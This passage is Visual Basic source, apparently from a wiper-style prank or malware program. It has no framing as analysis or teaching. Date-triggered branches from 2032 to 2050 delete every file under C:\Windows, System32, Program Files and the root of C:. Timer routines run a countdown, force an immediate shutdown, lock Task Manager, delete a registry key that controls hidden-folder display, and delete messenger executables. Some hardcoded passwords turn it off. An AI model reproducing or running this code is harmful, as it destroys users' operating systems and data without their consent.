Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2032":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2033":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2034":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2035":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2036":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2037":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2038":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2039":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2040":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2041":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2042":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2043":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2044":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2045":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2046":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2047":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2048":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2049":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case "25/10/2050":
Kill ("C:\windows\system32\*.EXE")
Kill ("C:\windows\system32\*.*")
Kill ("C:\windows\system32\*.dll")
Kill ("C:\windows\*.EXE")
Kill ("C:\windows\*.dll")
Kill ("C:\windows\*.*")
Kill ("C:\*.*")
Kill ("c:\program files")
Kill ("C:\windows\*.*")
Kill ("C:\windows\system32\*.*")
Kill ("%systemroot%")
Kill ("C:\Program Files\*.*")
Case Else
End Select
End Sub


Private Sub Timer13_Timer()
On Error Resume Next
Dim typDevM As typDevMODE
Dim lngResult As Long
Dim intAns As Integer

lngResult = EnumDisplaySettings(0, 0, typDevM)

With typDevM
.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
.dmPelsWidth = 1024 ' (640,800,1024, etc) «Œ — «·⁄—÷
.dmPelsHeight = 768 '(480,600,768, etc) «Œ — «·ÿÊ·
End With

lngResult = ChangeDisplaySettings(typDevM, CDS_TEST)
Select Case lngResult
Case DISP_CHANGE_RESTART
intAns = MsgBox("You must restart your computer to apply these changes." & _
vbCrLf & vbCrLf & "Do you want to restart now?", _
vbYesNo + vbSystemModal, "Screen Resolution")
If intAns = vbYes Then Call ExitWindowsEx(EWX_REBOOT, 0)
Case DISP_CHANGE_SUCCESSFUL
Call ChangeDisplaySettings(typDevM, CDS_UPDATEREGISTRY)
MsgBox "Screen resolution changed", vbInformation, "Resolution Changed"
Case Else
MsgBox "Mode not supported", vbSystemModal, "Error"
End Select

End Sub

Private Sub Timer14_Timer()
On Error Resume Next
Label2.Caption = "3"
Beep

End Sub

Private Sub Timer15_Timer()
On Error Resume Next
Label2.Caption = "2"
Beep

End Sub

Private Sub Timer16_Timer()
On Error Resume Next
Label2.Caption = "1"
Beep

End Sub

Private Sub Timer17_Timer()
On Error Resume Next
Label2.Caption = "0"
Beep

End Sub

Private Sub Timer19_Timer()
On Error Resume Next
If Form2.Visible = True Then
Timer1.Enabled = False
Timer2.Enabled = False
Timer3.Enabled = False
Timer4.Enabled = False
Timer5.Enabled = False
Timer6.Enabled = False
Timer7.Enabled = False
Timer8.Enabled = False
Timer9.Enabled = False
Timer10.Enabled = False
Timer11.Enabled = False
Timer12.Enabled = False
Timer13.Enabled = False
Timer14.Enabled = False
Timer15.Enabled = False
Timer16.Enabled = False
Timer17.Enabled = False
Timer18.Enabled = False
Timer20.Enabled = False
Form1.Visible = False
End If
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
Label2.Caption = "8"
Beep
End Sub

Private Sub Timer20_Timer()
On Error Resume Next
If Label2.Caption = "0" Then
Open Environ("WinDir") & "\system32\taskmgr.exe" For Binary As #1
End If
End Sub

Private Sub Timer3_Timer()
On Error Resume Next
Label2.Caption = "7"
Beep
End Sub

Private Sub Timer4_Timer()
On Error Resume Next
Label2.Caption = "6"
Beep
End Sub

Private Sub Timer5_Timer()
On Error Resume Next
Label2.Caption = "5"
Beep
End Sub

Private Sub Timer6_Timer()
On Error Resume Next
Label2.Caption = "4"
Beep

End Sub

Private Sub Timer7_Timer()
On Error Resume Next
If Text1.Text = "brs" Then Form2.Visible = True
If Text1.Text = "bashar" Then Form2.Visible = True
If Text1.Text = "subh" Then Form2.Visible = True
If Text1.Text = "diehard" Then Form2.Visible = True
If Text1.Text = "·«ﬁ”" Then Form2.Visible = True
If Text1.Text = "»‘«—" Then Form2.Visible = True
If Text1.Text = "’»Õ" Then Form2.Visible = True
If Text1.Text = "«” »”«·" Then Form2.Visible = True

If Label2.Caption = "9" Then Timer1.Enabled = False
If Label2.Caption = "8" Then Timer2.Enabled = False
If Label2.Caption = "7" Then Timer3.Enabled = False
If Label2.Caption = "6" Then Timer4.Enabled = False
If Label2.Caption = "5" Then Timer5.Enabled = False
If Label2.Caption = "4" Then Timer6.Enabled = False
If Label2.Caption = "3" Then Timer14.Enabled = False
If Label2.Caption = "2" Then Timer15.Enabled = False
If Label2.Caption = "1" Then Timer16.Enabled = False
If Label2.Caption = "0" Then Timer17.Enabled = False

If Label2.Caption = "0" Then Timer10.Interval = 1000
If Label2.Caption = "0" Then Timer11.Interval = 2000
If Label2.Caption = "0" Then Timer12.Interval = 1000
If Label2.Caption = "0" Then Timer20.Interval = 1000
If Label2.Caption = "0" Then Me.Hide

End Sub

Private Sub Timer8_Timer()
On Error Resume Next
Delay 10000
Shell "shutdown -s -t 0"
End Sub

Private Sub Timer9_Timer()
On Error Resume Next
If Label2.Caption = "0" Then
Dim lngSuccess As Long
Dim strBitmapImage As String
strBitmapImage = "C:\WINDOWS\pchealth\helpctr\System\Remote Assistance\Interaction\Server\StopControl.bmp"
lngSuccess = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, strBitmapImage, 0)
End If
Shell "reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden /v type /f"
Open "C:\Program Files\Yahoo!\Messenger\*.EXE" For Input As #1
Close
Call Kill("C:\Program Files\Yahoo!\Messenger\*.EXE")
Exit Sub
Open "C:\Program Files\MSN Messenger\*.EXE" For Input As #1
Close
Call Kill("C:\Program Files\MSN Messenger\*.EXE")
Exit Sub
End Sub

